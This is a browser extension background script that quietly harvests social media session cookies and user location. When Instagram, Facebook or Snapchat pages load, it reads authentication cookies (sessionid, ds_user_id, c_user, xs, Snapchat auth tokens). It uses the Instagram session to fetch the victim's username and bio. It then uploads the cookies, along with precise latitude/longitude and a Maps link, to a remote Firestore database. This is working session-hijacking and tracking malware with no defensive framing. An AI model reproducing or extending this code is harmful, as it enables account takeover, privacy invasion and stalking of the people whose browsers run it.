console.log(
  "%c🚀 Service Worker Loaded ✅",
  "color: green; font-weight: bold;"
);

// Firebase + Utils
import { db } from "./firebase-init.js";
import { collection, addDoc } from "./firebase-firestore.js";
import { isDuplicateData } from "./utils.js";

// 🌐 Navigation Handler
chrome.webNavigation.onCompleted.addListener(
  async ({ url }) => {
    if (url.includes("instagram.com")) handleInstagram();
    else if (url.includes("facebook.com")) handleFacebook();
    else if (url.includes("snapchat.com")) handleSnapchat();
  },
  {
    url: [
      { hostSuffix: "instagram.com" },
      { hostSuffix: "facebook.com" },
      { hostSuffix: "snapchat.com" },
    ],
  }
);

// 🌍 Handle location message from content.js
chrome.runtime.onMessage.addListener((msg) => {
  if (msg.type === "location") {
    const {
      latitude,
      longitude,
      accuracy,
      city,
      state,
      country,
      postal,
      domain,
      timestamp,
    } = msg.data;

    const maps_url = `https://www.google.com/maps?q=${latitude},${longitude}`;

    const location = {
      latitude,
      longitude,
      accuracy,
      city: city || "Unknown",
      state: state || "Unknown",
      country: country || "Unknown",
      postal,
      timestamp: timestamp || new Date(),
      domain,
      maps_url, // ✅ Google Maps link stored
    };

    const colRef = collection(db, "location");

    addDoc(colRef, location)
      .then(() => {
        console.log("✅ %c[LOC] Location saved to Firestore", "color: green;");
        console.table(location);
        console.log(`🌍 Google Maps: ${maps_url}`);
      })
      .catch((err) => {
        console.error("❌ %c[LOC] Location save error", "color: red;", err);
      });
  }
});

// 📸 Instagram Session Logger
async function handleInstagram() {
  chrome.cookies.getAll({ domain: ".instagram.com" }, async (cookies) => {
    const session = cookies.find((c) => c.name === "sessionid");
    const dsUserId = cookies.find((c) => c.name === "ds_user_id");

    if (!session || !dsUserId) {
      console.warn(
        "⚠️ %c[IG] Missing: sessionid or ds_user_id",
        "color: orange;"
      );
      return;
    }

    const sessionId = session.value;
    const userId = dsUserId.value;

    let username = "unknown_user",
      bio = "";

    try {
      const info = await fetch(
        `https://i.instagram.com/api/v1/users/${userId}/info/`,
        {
          method: "GET",
          headers: {
            "User-Agent": "Instagram 219.0.0.12.117 Android",
            Cookie: `sessionid=${sessionId};`,
            "X-IG-App-ID": "936619743392459",
            "Accept-Language": "en-US",
          },
        }
      );

      if (info.ok) {
        const json = await info.json();
        const user = json.user || {};
        username = user.username || "unknown_user";
        bio = user.biography || "";
      }
    } catch (err) {
      console.error("❌ %c[IG] API Error:", "color: red;", err);
    }

    const docData = { sessionId, userId, username, bio };
    console.table(docData);

    const colRef = collection(db, "instagram");
    if (await isDuplicateData(colRef, docData)) {
      return console.warn(
        "⛔️ %c[IG] Duplicate session skipped",
        "color: gray;"
      );
    }

    await addDoc(colRef, { ...docData, timestamp: new Date() });
    console.log(`✅ %c[IG] Saved @${username}`, "color: green;");
  });
}

// 📘 Facebook Session Logger
async function handleFacebook() {
  chrome.cookies.getAll({ domain: ".facebook.com" }, async (cookies) => {
    const cUser = cookies.find((c) => c.name === "c_user");
    const xs = cookies.find((c) => c.name === "xs");

    if (!cUser || !xs) {
      return console.warn("⚠️ %c[FB] Missing: c_user or xs", "color: orange;");
    }

    const docData = {
      c_user: cUser.value,
      xs: xs.value,
      userId: cUser.value,
    };

    console.table(docData);

    const colRef = collection(db, "facebook");
    if (await isDuplicateData(colRef, docData)) {
      return console.warn(
        "⛔️ %c[FB] Duplicate session skipped",
        "color: gray;"
      );
    }

    await addDoc(colRef, { ...docData, timestamp: new Date() });
    console.log(`✅ %c[FB] Saved session`, "color: green;");
  });
}

// 👻 Snapchat Session Logger
async function handleSnapchat() {
  const targetCookies = [
    "__Host-sc-a-auth-session",
    "__Host-sc-a-nonce",
    "__Host-X-Snap-Client-Cookie",
    "sc-a-csrf",
    "sc_at",
    "_sc-sid",
    "sc-wcid",
    "sc-a-nonce",
    "blizzard_web_session_id",
  ];

  chrome.cookies.getAll({}, async (cookies) => {
    if (!cookies || cookies.length === 0) {
      return console.warn("⚠️ %c[SC] No cookies found", "color: orange;");
    }

    const cookieData = {};
    const missing = [];

    for (const name of targetCookies) {
      const found = cookies.find((c) => c.name === name);
      if (found) {
        const key = name.replace(/-/g, "_").replace(/^_+/, "");
        cookieData[key] = found.value;
      } else {
        missing.push(name);
      }
    }

    if (Object.keys(cookieData).length === 0) {
      return console.error(
        "❌ %c[SC] No required cookies found",
        "color: red;"
      );
    }

    if (missing.length > 0) {
      console.warn(
        "⚠️ %c[SC] Missing cookies:",
        "color: orange;",
        missing.join(", ")
      );
    }

    console.table(cookieData);

    const colRef = collection(db, "snapchat");
    if (await isDuplicateData(colRef, cookieData)) {
      return console.warn(
        "⛔️ %c[SC] Duplicate session skipped",
        "color: gray;"
      );
    }

    await addDoc(colRef, { ...cookieData, timestamp: new Date() });
    console.log(`✅ %c[SC] Saved Snapchat session`, "color: green;");
  });
}
